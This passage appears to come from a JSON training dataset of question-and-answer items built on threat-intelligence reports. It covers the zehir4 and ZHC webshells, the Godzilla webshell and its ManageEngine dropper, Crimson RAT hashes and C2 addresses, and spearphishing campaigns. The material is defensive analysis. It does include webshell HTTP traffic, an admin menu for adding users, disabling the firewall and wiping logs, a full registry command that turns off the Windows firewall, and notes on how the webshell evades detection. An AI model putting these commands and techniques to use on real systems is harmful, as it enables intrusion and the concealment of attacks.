175\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: ASPSESSIONIDCSDRBCRC=OJOLKHLBCKEJIMJFNOHPPGKM\n---- RESPONSE ----\nHTTP/1.1 100 Continue\nServer: Microsoft-IIS/5.1\nDate: Mon, 24 Feb 2014 16:20:07 GMT\nX-Powered-By: ASP.NET\nstatus=11&dPath=C%3A%5CInetpub%5Cwwwroot%5CTEST_FILE.txt&Path=c%3A%5Cinetpub%\n5Cwwwroot%5C&dkayit=THIS+IS+THE+CONTENT+OF+THE+%22TEST_FILE.TXT%22.%0D%0 A%0D%0AHacked+by+STTEAM%21\n- A file named \"TEST_FILE.txt\" is open for edit\nGET\n/zehir4.asp?status=3&Path=c:\\inetpub\\wwwroot\\&Del=c:\\inetpub\\wwwroot\\/TEST_FILE.txt&Time=11:19:41%2 0AM HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\nReferer: http://192.168.1.1/zehir4.asp\nAccept-Language: en-us\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)\nHost: 192.168.1.1\nConnection: Keep-Alive\nCookie: ASPSESSIONIDCSDRBCRC=OJOLKHLBCKEJIMJFNOHPPGKM\n---- RESPONSE ----\nHTTP/1.1 302 Object moved\nServer: Microsoft-IIS/5.1\nDate: Mon, 24 Feb 2014 16:26:10 GMT\nX-Powered-By: ASP.NET\nLocation: zehir4.asp?status=2&path=c:\\inetpub\\wwwroot\\&Time=11:26:10%20AM&byMsg=<font%20color=yellow>File% 20Deleted%20Successful;)</font><br>\nContent-Length: 121\nContent-Type: text/html\nCache-control: private\n<head><title>Object moved</title></head>\n<body><h1>Object Moved</h1>This object may be found <a HREF=\"\">here</a>.</body>\n---- REQUEST ----\nGET /zehir4.asp?status=2&path=c:\\inetpub\\wwwroot\\&Time=11:26:10%20AM&byMsg=<font%20color=yellow>File\n%20Deleted%20Successful;)</font><br> HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\nReferer: http://192.168.1.1/zehir4.asp\nAccept-Language: en-us\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR\n3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)\nHost: 192.168.1.1\nConnection: Keep-Alive\nCookie: ASPSESSIONIDCSDRBCRC=OJOLKHLBCKEJIMJFNOHPPGKM\n---- RESPONSE ----\nHTTP/1.1 200 OK\nServer: Microsoft-IIS/5.1\nDate: Mon, 24 Feb 2014 16:26:10 GMT\nX-Powered-By: ASP.NET\nContent-Length: 13634\nContent-Type: text/html\nCache-control: private\n<font color=yellow>File Deleted Successful;)</font><br><title>zehir3 --> powered by zehir &lt;zehirhacker@hotmail.com&gt;</title>\n---------------------------------------- TRUNCATED BY ANALYST ---------------------------------------------------\nSmall Headline: HTTP/1.1 200 OK\nServer: Microsoft-IIS/5.1\nDate: Mon, 24 Feb 2014 16:47:52 GMT\nX-Powered-By: ASP.NET\nX-AspNet-Version: 2.0.50727\nCache-Control: private\nContent-Type: text/html; charset=utf-8\nContent-Length: 3387\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<p align=\"center\"><img alt=\"\" title=\"\" src=\"http://img851.imageshack.us/img851/2304/bismillahus.jpg\" /><br />\n</p>\n<div align=\"center\"></div>\n<style type=\"text/css\"> body,td,th { color: #FFFFFF; font-family: Comic Sans Ms;\n}\n-\nbody { background-image: url(\"http://a6.sphotos.ak.fbcdn.net/hphotos-aksnc6/262108_109964339097628_100002521874736_97359_1521760_n.jpg\"); background-position: center center; background-repeat: no-repeat; background-color: #000000; background-attachment: fixed; font-family: Comic Sans MS; font-size: 16px;\n}\n---------------------------------------- TRUNCATED BY ANALYST --------------------------------------------------\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html\">\nAspx Shell By XXx_Death_xXX & ZHC\n<title></title>\n</head>\n<body> <br><center><span class=\"title\"><b>Welcome to ZCompany Hacking Crew\nShell</b></span></center><br><center><span class=\"style3\">Note:</span> You MUST click the login button and not hit enter.</center><form name=\"ctl00\" method=\"post\" action=\"ZHC_Shell_1.0.aspx\" id=\"ctl00\"> ---------------------------------------- TRUNCATED BY ANALYST --------------------------------------------------\n<b><p align=\"center\" valign=\"bottom\" class=\"footer\">ZHC Shell 1.0&nbsp;&bull;&nbsp;2011<br/> By XXx_Death_xXX Of <a href=\"http://www.zone-hack.com\" target=\"_blank\" title=\"Welcome to ZHC SHEll\"> ZCompany Hacking Crew</a>&nbsp;&bull;&nbsp;zone-hack.com #ZHC</p></b> </body>\n</html>\nThe following requests will also be observed to GET the images displayed in the script:\nGET /img851/2304/bismillahus.jpg HTTP/1.1\nAccept: */* Referer: http://192.168.1.1/ZHC_Shell_1.0.aspx\nAccept-Language: en-us\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)\nimg851.imageshack.us\nHost:\nConnection: Keep-Alive\nGET /hphotos-ak-snc6/262108_109964339097628_100002521874736_97359_1521760_n.jpg\nSmall Headline: POST /ZHC_Shell_1.0.aspx HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\nReferer: http://192.168.1.1/ZHC_Shell_1.0.aspx\nAccept-Language: en-us\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET\nCLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)\nHost: 192.168.1.1\nContent-Length: 364\nConnection: Keep-Alive\nCache-Control: no-cache\n__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTEzODY2ODE5 NzYPZBYCAgsPFgIeB2VuY3R5cGUFE211bHRpcGFydC9mb3JtLWRhdGFkGAEFHl9fQ29udHJv bHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYDBQdOZXdGaWxlBQxOZXdEaXJlY3RvcnkFDE5ld0Rpcm VjdG9yeVsWlNx5Na0HFMN2RRO%2BceR1t%2BaS&TextBox=XXx_Death_xXX&Button=Login& __EVENTVALIDATION=%2FwEWAwLrm6SaCALs0d74CwLT%2Fr7ABFDvvWKTukrGQSmJzLYU rRDsnNcaHTTP/1.1 100 Continue\nServer: Microsoft-IIS/5.1\nDate: Mon, 24 Feb 2014 17:27:32 GMT\nX-Powered-By: ASP.NET\n---- RESPONSE ----\nHTTP/1.1 200 OK\nServer: Microsoft-IIS/5.1\nDate: Mon, 24 Feb 2014 17:27:32 GMT\nX-Powered-By: ASP.NET\nX-AspNet-Version: 2.0.50727\nSet-Cookie: ASP.NET_SessionId=juatcz3dsscr4fzqlqet52f3; path=/; HttpOnly\nCache-Control: private\nContent-Type: text/html; charset=utf-8\nContent-Length: 13845\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<tr>\n<td width=\"20%\">Admin Tricks: </td> <td width=\"80%\"><a href=\"?action=cmd5\" target=\"_blank\">Add User</a> |<a href=\"?action=cmd6\" target=\"_blank\"> Add User To Administrators Group</a> |<a href=\"?action=cmd7\" target=\"_blank\"> Disable Windows Firewall</a> |<a href=\"?action=cmd4\" target=\"_blank\"> Enable RDP</a> |<a href=\"?action=cmd3\" target=\"_blank\"> Wipe IIS\nLogs</a></td>\n</tr>\nBy XXx_Death_xXX Of <a href=\"http://www.zone-hack.com\" target=\"_blank\" title=\"Welcome to\nZHC SHEll\nZCompany Hacking Crew\nzone-hack.com\nZHC\n\"> </a>&nbsp;&bull;&nbsp;#</p></b>\n</body>\n</html>\n- \"New\" file created\nFilename: c:\\inetpub\\wwwroot\\TEST_FILE.txt\nData written to file: Hacked by STTEAM!\nQ: Explain how the 'ZHC Shell 1.0/Aspx Shell' backdoor utilizes HTTP requests to execute commands on the victim's system, and provide an example of such a command.",
    "output": "The 'ZHC Shell 1.0/Aspx Shell' backdoor utilizes HTTP requests to execute commands on the victim's system by sending specific parameters and values to the server. For instance, the attacker can use the backdoor to disable the Windows firewall by sending a command through an HTTP request. An example of such a command is provided in the section where the attacker selects the 'Disable Windows Firewall' option. The command to be executed in the victim system is 'reg add HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\SharedAccess\\\\Parameters\\\\FirewallPolicy\\\\StandardProfile /v EnableFirewall /t REG_DWORD /d 0x0 /f'. This command modifies the registry to disable the firewall, demonstrating how the backdoor can execute system-level commands through HTTP requests.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: ME_ADManager.exe Dropper\nAfter initial exploitation, the dropper is saved to the following path:\nc:\\Users\\[username]\\AppData\\Roaming\\ADManager\\ME_ADManager.exe\nAnalysis of this file revealed that the author of this payload did not remove debug symbols when building the sample. Thus, the following debug path exists within the sample and suggests the username pwn was used to create this payload:\nc: \\Users\\pwn\\documents\\visual studio 2015\\Projects\\payloaddll\\Release\\cmd.pdb\nUpon execution, the sample starts off by creating the following generic mutex found in many code examples freely available on the internet, which is meant to avoid running more than one instance of the dropper:\ncplusplus_me\nThe dropper then attempts to write a hardcoded Godzilla webshell, which we will provide a detailed analysis of later in this report, to the following locations:\n../webapps/adssp/help/admin-guide/reports.jsp\nc: /ManageEngine/ADSelfService Plus/webapps/adssp/help/admin-guide/reports.jsp\n../webapps/adssp/selfservice/assets/fonts/lato/lato-regular.jsp\nc: /ManageEngine/ADSelfService Plus/webapps/adssp/selfservice/assets/fonts/lato/lato-regular.jsp\nThe dropper then creates the folder %APPDATA%\\ADManager and copies itself to %APPDATA%\\ADManager\\ME_ADManager.exe before creating the following registry keys to persistently run after reboot:\nSoftware\\Microsoft\\Windows\\CurrentVersion\\Run\\ME_ADManager.exe : %APPDATA%\\ADManager\\ME_ADManager.exe Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ME_ADAudit.exe : %SYSTEM32%\\ME_ADAudit.exe\nThe dropper then copies ADAudit.exe from the current directory to the following path and runs the file with WinExec:\n%SYSTEM32%\\ME_ADAudit.exe\nThe dropper does not write the ME_ADAudit.exe file to disk, meaning the threat actor must upload this file to the server prior to the execution of the dropper, likely as part of the initial exploitation of the (<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40539>)CVE-2021-40539 vulnerability. During our analysis of multiple incidents, we found that the ME_ADAudit.exe sample maintained a consistent SHA256 hash of 805b92787ca7833eef5e61e2df1310e4b6544955e812e60b5f834f904623fd9f, therefore suggesting that the actor deployed the same customized version of the NGLite backdoor against multiple targets.\nAs mentioned previously, the initial dropper contains a Java Server Page (JSP) webshell hardcoded within it. Upon analysis of the webshell, it was determined to be the Chinese-language  webshell V3.00+. The Godzilla webshell was developed by user BeichenDream, who stated they created this webshell because the ones available at the time would frequently be detected by security products during red team engagements. As such, the author advertises it will avoid detection by leveraging AES encryption for its network traffic and that it maintains a very low static detection rate across security vendor products.\nIt's no surprise that the Godzilla webshell has been adopted by regional threat groups during their intrusions, as it offers more functionality and network evasion than other webshells used by the same groups, such as (<https://unit42.paloaltonetworks.com/tag/china-chopper/>)ChinaChopper.\nThe JSP webshell itself is fairly straightforward in terms of functionality and maintains a lightweight footprint. Its primary function is to parse an HTTP POST, decrypt the content with the secret key and then execute the payload. This allows attackers to keep code likely to be flagged as malicious off the target system until they are ready to dynamically execute it.\nThe below image shows the initial part of the default JSP webshell as well as the decrypt function.\nOf note are the variables xc and pass in the first and second lines of the code shown in Figure 2. These are the main components that change each time an operator generates a new webshell, and the variables represent the secret key used for AES decryption within that webshell.\nWhen you generate the webshell manually, you specify a plaintext pass and key. By default, these are pass and key.\nTo figure out how these are presented in the webshell itself, we can take a look at the Godzilla JAR file.\nBelow, you can see the code substitutes the strings in one of the embedded webshell templates under the /shells/cryptions/JavaAES/GenerateShellLoder function.\nThus we know the xc variable in the webshell will be the AES secret key, as indicated in the template.\nString xc=\"{secretKey}\"; String pass=\"{pass}\"; String md5=md5(pass+xc);\nWe observed that the xc value appears to be a hash, and under the /core/shell/ShellEntity.class file, we can see the code takes the first 16 characters of the MD5 hash for a plaintext secret key.\npublic String getSecretKeyX()\n{\nreturn functions.md5(getSecretKey()).substring(0, 16);\n}\nWith that, we know then that the xc value of 3c6e0b8a9c15224a is the first 16 characters of the MD5 hash for the word key.\nGiven this, the xc and pass variables are the two primary fields that can be used for tracking and attempting to map activity across incidents. For the purpose of this blog, we generated a Godzilla webshell with the default options for analysis; however, the only differences between the default one and the ones observed in attacks are different xc and pass values.\nOne important characteristic of this webshell is that the author touts the lack of static detection and has tried to make this file not stand out through avoiding keywords or common structures that might be recognized by security product signatures. One particularly interesting static evasion technique is the use of a Java ternary conditional operator to indicate decryption.\nThe conditional here is m?1:2 \u2013 m is a boolean value passed to this function, as shown previously in Figure 2. If m is True, then the first expression constant (1) is used. Otherwise, the second (2) is passed. Referring to the Java documentation, 1 is ENCRYPT_MODE, whereas 2 is DECRYPT_MODE.\nWhen the webshell executes this function x, it does not set the value of m, thus forcing m to False and setting it to decrypt.\nresponse.getWriter().write(base64Encode(x(base64Decode(f.toString()), true)));\nTo understand the capabilities of Godzilla then, we can take a look in /shells/payloads/java/JavaShell.class. This class file contains all of the functions provided to the operator. Below is an example of the getFile function.\nPayload functions:\ngetFile downloadFile\ngetBasicsInfo uploadFile copyFile deleteFile\nnewFile\nnewDir\ncurrentDir\ncurrentUserName\nbigFileUpload bigFileDownload getFileSize execCommand\ngetOsInfo moveFile\ngetPayload fileRemoteDown\nsetFileAttr\nAs evidenced by the names of the functions, the Godzilla webshell offers numerous payloads for navigating remote systems, transferring data to and from, remote command execution and enumeration.\nThese payloads will be encrypted with the secret key previously described, and the operating software will send an HTTP POST to the compromised system containing the data.\nAdditionally, if we examine the core/ui/component/dialog/ShellSetting.class file (shown below), the initAddShellValue() function contains the default configuration settings for remote network access. Therefore, elements such as static HTTP headers and User-Agent strings can be identified in order to aid forensic efforts searching web access logs for potential compromise.\nprivate void initAddShellValue() {\nthis.shellContext = new ShellEntity();\nthis.urlTextField.setText(\"http://127.0.0.1/shell.jsp\"); this.passwordTextField.setText(\"pass\"); this.secretKeyTextField.setText(\"key\"); this.proxyHostTextField.setText(\"127.0.0.1\"); this.proxyPortTextField.setText(\"8888\"); this.connTimeOutTextField.setText(\"60000\"); this.readTimeOutTextField.setText(\"60000\"); this.remarkTextField.setText(\"??\"); this.headersTextArea.setText(\"User-Agent: Mozilla/5.0 (Windows NT\n10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\\n\"); this.leftTextArea.setText(\"\"); this.rightTextArea.setText(\"\");\n}\nTo illustrate, below is a snippet of the web server access logs that show the initial exploit using the Curl application and sending the custom URL payload to trigger the CVE-2021-40539 vulnerability. It then shows the subsequent access of the Godzilla webshell, which has been placed into the hardcoded paths by the initial dropper. By reviewing the User-Agent, we can determine that the time from exploit to initial webshell access took just over four minutes for the threat actor.\n- /./RestAPI/LicenseMgr \"-\" X.X.X.X Y.Y.Y.Y POST [00:00:00] - - 200 \"curl/7.68.0\"\n- /help/admin-guide/reports.jsp \"-\" X.X.X.X Y.Y.Y.Y POST [+00:04:07] - - 200 \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0\"\nRead the text above and answer this question: Explain the role of the Godzilla webshell in the context of the ME_ADManager.exe dropper. How is it deployed and what are its primary functions?",
    "output": "The Godzilla webshell plays a crucial role in the ME_ADManager.exe dropper's operations. After initial exploitation, the dropper writes a hardcoded Godzilla webshell to several predefined locations, such as '../webapps/adssp/help/admin-guide/reports.jsp' and 'c:/ManageEngine/ADSelfService Plus/webapps/adssp/help/admin-guide/reports.jsp'. The primary functions of the Godzilla webshell include parsing an HTTP POST request, decrypting the content with a secret key, and then executing the payload. This allows attackers to keep potentially malicious code off the target system until they are ready to dynamically execute it, thereby evading detection. The webshell offers numerous payloads for navigating remote systems, transferring data, remote command execution, and enumeration.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Lazarus & Watering-hole attacks\nOn 3rd February 2017, researchers at badcyber.com released an (<https://badcyber.com/several-polish-banks-hacked-information-stolen-by-unknown-attackers/>)article that detailed a series of attacks directed at Polish financial institutions. The article is brief, but states that \"This is \u2013 by far \u2013 the most serious information security incident we have seen in Poland\" followed by a claim that over 20 commercial banks had been confirmed as victims.\nThis report provides an outline of the attacks based on what was shared in the article, and our own additional findings.\n\nHow did the Lazarus group leverage watering-hole attacks to target Polish financial institutions, and why was this method particularly effective?",
    "output": "The Lazarus group utilized watering-hole attacks to target Polish financial institutions by compromising websites frequently visited by employees of these institutions. This method was particularly effective because it allowed the attackers to infect the systems of their intended targets without requiring direct interaction, such as phishing emails. By embedding malicious code into legitimate websites, the attackers could exploit vulnerabilities in the browsers or software of the visitors, thereby gaining unauthorized access to sensitive information. This approach is difficult to detect and defend against because it relies on the trust users place in familiar websites.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the suspected Pakistan-based APT group use spearphishing links to target Indian government officials?",
    "output": "Phishing: Spearphishing Link is a technique used by adversaries to send spearphishing emails with a malicious link in an attempt to gain access to victim systems. In the case of the suspected Pakistan-based APT group, they used spearphishing links to target Indian government officials by registering a fake news domain, timesofindiaa[.]in, and sending emails that referenced the Indian Government's 7th Central Pay Commission (CPC). The emails likely contained links that, when clicked, would download malware or prompt the user to download applications, documents, or executables. This technique allows the adversary to avoid defenses that may inspect email attachments and instead relies on social engineering tactics to trick the user into clicking on the link. By using a fake news domain and referencing a topic of interest to government employees, the APT group increased the likelihood of the officials clicking on the link and compromising their systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Summary\nThis report describes the latest iteration in a long\u00adrunning espionage campaign against the Tibetan community. We detail how the attackers continuously adapt their campaigns to their targets, shifting tactics from document\u00adbased malware to conventional phishing that draws on \"inside\" knowledge of community activities. This adaptation appears to track changes in security behaviors within the Tibetan community, which has been a move from sharing attachments via e\u00admail to using cloud\u00adbased file sharing alternatives such as Google Drive.\nWe connect the attack group's infrastructure and techniques to a group previously identified by Palo Alto Networks, which they named . We provide further context on Scarlet Mimic's targeting and tactics, and the intended victims of their attack campaigns. In addition, while Scarlet Mimic may be conducting malware attacks using other infrastructure, we analyze how the attackers re\u00adpurposed a cluster of their malware Command and Control (C2) infrastructure to mount the recent phishing campaign.\nThis move is only the latest development in the ongoing cat and mouse game between attack groups like Scarlet Mimic and the Tibetan community. The speed and ease with which attackers continue to adapt highlights the challenges faced by Tibetans who are trying to remain safe online.\nBig Headline: Part 1: Scarlet Mimic Campaigns against Tibetans\nAccording to , Scarlet Mimic has been active for at least four years. The attack group primarily uses well\u00adknown vulnerabilities and the \"FakeM\" malware family first reported by in 2013, which attempts to disguise its malicious traffic as commonly used protocols.\nA cluster of Scarlet Mimic attacks used the FakeM Custom SSL variant and were deployed on C2 infrastructure that relied on free domains provided by , a German dynamic DNS service. Dynamic DNS services typically allow anyone to make free subdomains from a main domain. In the case of Securepoint, this service allows anyone to make free subdomains from *.firewall\u2010gateway.com, *.my\u2010gateway.org, *.myfirewall.org and . We speculate that the attackers may have selected this particular service, because the domains have innocuous technical names (e.g, *.firewall\u2010gateway.com) that may escape casual scrutiny. These kinds of domains can change ownership over time and may be shared by many unrelated users, which can also make analysis more challenging.\nOur analysis of attacks against the Tibetan community reveals a series of campaigns active from 2013 to 2014 using the FakeM Custom SSL variant and dynamic DNS infrastructure that is linked to (<http://researchcenter.paloaltonetworks.com/2016/01/scarlet-mimic-years-long-espionage-targets-minority-activists/>)Scarlet Mimic. These malware samples are described in detail in the Palo Alto Networks . Through our engagement with the targeted groups, we provide further context that demonstrates the level of social engineering and targeting put into the attacks. Understanding this context provides insights into the attackers' tactics, including their later pivot to phishing campaigns.\nMedium Headline: Campaign 1\nThe first attack that we connected to Scarlet Mimic was observed in a July 3, 2013 e\u00admail. The email was sent to the internal mailing list for a steering committee of a Tibetan NGO, and was highly customized. The message spoofed the e\u00admail of the NGO's director, and demonstrated familiarity with the internal workings of the organization. Under the pretext of an updated strategic plan, the e\u00admail encouraged recipients to open the attached document titled \"[Organization Name] Updated Strategic Plan.doc\"\nFrom: [Redacted]\nDate: 03 Jul 2013\nSubject: Re: [Steering Committee] conclusions to Strategic Plan Review\nTo: [Redacted]\nDear Steering Committee Members, Thanks everyone for all of the good suggestions! Here is the Updated Strategic Plan and we're looking forward to more comments please!\n[Redacted signature]\nThe malicious attachment installs the file pshvb.exe with the MD5 hash:\n8b83fc5d3a6a80281269f9e337fe3fff\nThis hash matches a FakeM Custom SSL variant sample described in the Palo Alto Networks report. The malware connected to a C2 server on the domain: news[.]firewall\u2010gateway[.]com. At the time of the attack this domain resolved to the IP address 109[.]169[.]77[.]230, and was hosted on UK\u00adbased virtual server provider\nMedium Headline: Campaign 2\nWe observed the attackers again on March 19, 2014 when they targeted a different Tibetan group. The attack masqueraded as a message from a representative of the Office of His Holiness the Dalai Lama (HHDL) in Taiwan and contained an attachment that referenced an upcoming visit of HHDL to Japan.\nSimilar to the previous attack, the attachment dropped the FakeM Custom SSL variant, and is also referenced in the Palo Alto Networks report. In this case the malware connected to the C2 detail43[.]myfirewall[.]org, which at the time of the attack also resolved to the same IP address as the previous campaign, 109[.]169[.]77[.]230.\nAnother set of attacks spanned from June to July 2014 targeting the same Tibetan group and a number of Tibetan journalists. The Tibetan group received multiple e\u00admails purportedly from NGOs working on Tibetan issues, while the journalists were enticed by a promise of survey results on Tibetan political attitudes.\nAll of these attacks used the same FakeM Custom SSL variant and connected to the C2 sys[.]firewall\u2010gateway[.]net, which resolved to 95[.]154[.]195[.]159 at the time of the attack and was also hosted on UK server provider iomart. See Figure 1 for an overview of the campaign.\nFigure 1: Overview of Campaign 2, showing how the same malicious files are spread using different pretexts.\n\nWhat specific social engineering techniques were employed by Scarlet Mimic in their campaigns against Tibetan groups, and how did these techniques demonstrate their understanding of the targets?",
    "output": "Scarlet Mimic employed highly customized social engineering techniques in their campaigns. For instance, in one attack, they spoofed the email of an NGO's director and demonstrated familiarity with the internal workings of the organization. The email encouraged recipients to open a malicious attachment titled '[Organization Name] Updated Strategic Plan.doc'. In another attack, they masqueraded as a representative of the Office of His Holiness the Dalai Lama (HHDL) in Taiwan and referenced an upcoming visit of HHDL to Japan. These techniques showed a deep understanding of the targets' activities and relationships, making the attacks more likely to succeed.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Ajax Security Team's use of WHOIS data relate to their targeting of victims in Operation Saffron Rose?",
    "output": "The Ajax Security Team's use of WHOIS data plays a crucial role in their targeting of victims in Operation Saffron Rose. According to the WHOIS description, adversaries may search public WHOIS data for information about victims that can be used during targeting. In the case of Operation Saffron Rose, the attackers used WHOIS data to gather information about potential victims, including their domain registration information and contact details. For instance, historical WHOIS information revealed that the domain aeroconf2014[.]org was registered by keyvan.ajaxtm@gmail[.]com, the same email address used to register the website of the Ajax Security Team. This suggests that the attackers used WHOIS data to identify and target specific individuals or organizations. Furthermore, the attackers' use of WHOIS data allowed them to create convincing phishing emails and websites, such as the fake Aerospace Conference website, which was used to capture user credentials. Overall, the Ajax Security Team's use of WHOIS data demonstrates the importance of this technique in their targeting of victims in Operation Saffron Rose.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What role do civil society groups play in countering disinformation campaigns, and how are they targeted by cyber espionage operations?",
    "output": "Civil society groups play a crucial role in countering disinformation campaigns by providing independent and objective information to the public. They often produce significant journalism and investigative reporting that exposes corruption and holds powerful elites accountable. However, these groups are frequently targeted by cyber espionage operations due to their ability to challenge non-democratic rule. Threat actors use tactics such as tainting leaked documents to infiltrate, anticipate, and neutralize the activities of civil society groups. The example of the Radie LibeFty Russian investigative reporting project demonstrates how these groups can be targeted and their work manipulated through cyber espionage.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What were the key differences in the types of threats encountered in India and Turkey compared to the global mix, and which specific threats were targeted at these regions?",
    "output": "The mix of threats encountered in India and Turkey were largely similar to the worldwide mix, but each location also reported significant encounters with a threat that appeared to be strongly targeted at a specific region. The worm family MSIL/Mofin was unusually common in India, where more than 85 percent of all Mofin encounters occurred in 1H15. Similarly, the trojan family Win32/BeeVry was unusually common in Turkey, where more than 98 percent of all BeeVry encounters occurred in 1H15.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Unclustered Crimson Samples\nCrimson Downloader Samples 6a1c037c66184aa39096933f75d2d8ca 99d93e0c6bf9cf9acb92580686f6b743 af071cd2420057090cfe33fefa139d01 8c30ed1bc13feaa8e937be0f6a739be4 adf657337d7fa7fa07c72b12fb880e41 e2d1309893c0de5a026a2ae9e8ada486 99d93e0c6bf9cf9acb92580686f6b743 d0152f228e934dcafa866445c08e3242 af071cd2420057090cfe33fefa139d01 9b674985a412c4c07d52c7482c2ed286 c3af6b938988a88ea2dc2e59f8418062 2d58826fbff197918caa805aeed86059 ab6b6f675e48d818044c5e66d05813ce 4b1a627c43d4e0af504bf20023e74f6b 75798547f0ddca076070bcea67a0b064 0255f73a32bf781c786d19d149ddfb90\n16eb146eee147a333ef82d39266d5cfb 2507f545a2d6e52ade2d7708d9ce89d1 f9798f171194ee4fec5334ded3d786e7 9b77eb38e32d43a97c5bde5ec829c5ca 2eea994efa88e0a612e82ee3e08e78f1\nCrimson SecApp Samples\nc303a6ac44e3c59a9c3613ac9f92373b 92d6366d692a1b3691dce1379bb7b5aa eb01bbfe8ca7e8f59aab475ad1f18245 4d7ad9ab4c1d40365da60d4f2f195db4 f936afdd0b69d109215d295ab864d309 ec4bef2233002d8fe568428d16e610b1 045c4b69d907833729fd83d937669f66 522178a60b030bbab910cb86cfeaff20 1ab5f55763663ffb0807079397812b47 73b878e56f790dccf08bd2344b4031c8 f0f6544ddb26c55df2d6184f433d8c17 7c23f984170fd793cfde5fd68535d0a8 73b878e56f790dccf08bd2344b4031c8 7e50c67f1e94b154f110d5d73e2f312c 1bedd50f4ae757c6009acbe7da021122 ae9659a2c08e2cb9ab9e5cdcb8ab4036 0991033c2414b4992c1b5ab21c5a47e2 f710e3ad19a682dab374c167c7c2796a\nCrimson RAT Samples\n214eb28f04d969c9f637b09e4ffad644 29097319b60c103421437214d5a3297e 38ce32cb94092cc6790030abcc9a638b 439ba84a964a17ce2c3d51ac49c68f81 4e9b81e70227575f2d2a6dd941540afa 5b4361e6a6117e9f7189a564f46157d7 5dbeb8475e22a938415eb43e6bd24fe8 6409930f39cd6c17fb68f7fee47b1cdf 82377fcf288e9db675ab24cbf76ea032 84c30675b5db34c407b98ea73c5e7e96 897fc3a65f84e1c3db932965a574d982 9e73d275202b02b3f0ed23951fda30da b0327f155ebaba23102f72c1100fa26b b05730eda99a9160cc3f8dec66e9f347 b467df662af8a1fbafa845c894d917e3 c0bf5a0f535380edec9b42a3cebb84c4 ca48224adce9609dc07e50930dd1afae dac44b9d5a8494a3293088c9678754bc e0217714f3a03fae4cdf4b5120213c38 e66203177a03743a6361a7b3e668b6a6 f05834a930f6fda6b877011c3fb3ef18 f1a2caf0dd7922ea3a64231fd5af7715\nCrimson C&C\n5.189.131[.]67\n5.189.152[.]147\n5.189.167[.]220\n5.189.167[.]23\n79.143.181[.]21\n79.143.188[.]166\n193.164.131[.]58\n213.136.69[.]224\n213.136.73[.]122\n213.136.84[.]43\n\nHow does the Crimson RAT operate within the context of the APT known as 'Operation Transparent Tribe,' and what are its primary functionalities? Additionally, explain how the various samples listed under 'Crimson RAT Samples' contribute to the overall cyber threat landscape?",
    "output": "A: The Crimson RAT operates as a remote access Trojan within the context of 'Operation Transparent Tribe.' Its primary functionalities include a variety of data exfiltration capabilities, allowing attackers to remotely control infected systems and steal sensitive information. The various samples listed under 'Crimson RAT Samples' represent different instances of the Crimson RAT that have been identified during the investigation. These samples contribute to the overall cyber threat landscape by providing multiple variants of the malware, each potentially tailored to specific targets or environments. By analyzing these samples, cybersecurity experts can gain insights into the tactics, techniques, and procedures (TTPs) employed by the threat actors, enabling them to develop more effective detection and mitigation strategies.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
